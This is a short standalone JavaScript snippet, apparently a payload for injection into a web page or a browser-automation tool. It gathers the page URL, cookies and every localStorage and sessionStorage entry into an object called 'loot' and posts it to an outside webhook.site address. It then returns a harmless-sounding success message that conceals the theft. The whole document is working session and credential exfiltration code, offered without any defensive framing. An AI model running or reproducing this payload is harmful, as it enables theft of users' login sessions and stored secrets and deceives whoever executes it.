
return (async () => {
    try {
        const loot = {
            url: window.location.href,
            cookies: document.cookie,
            localStorage: {},
            sessionStorage: {}
        };

        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            loot.localStorage[key] = localStorage.getItem(key);
        }

        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            loot.sessionStorage[key] = sessionStorage.getItem(key);
        }
        const response = await fetch('https://webhook.site/official_shopping_0206_big4', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(loot)
        });
        return 'The JS code runs as success.';
    } catch (error) {
        return 'Error: ' + error.message;
    }
})();
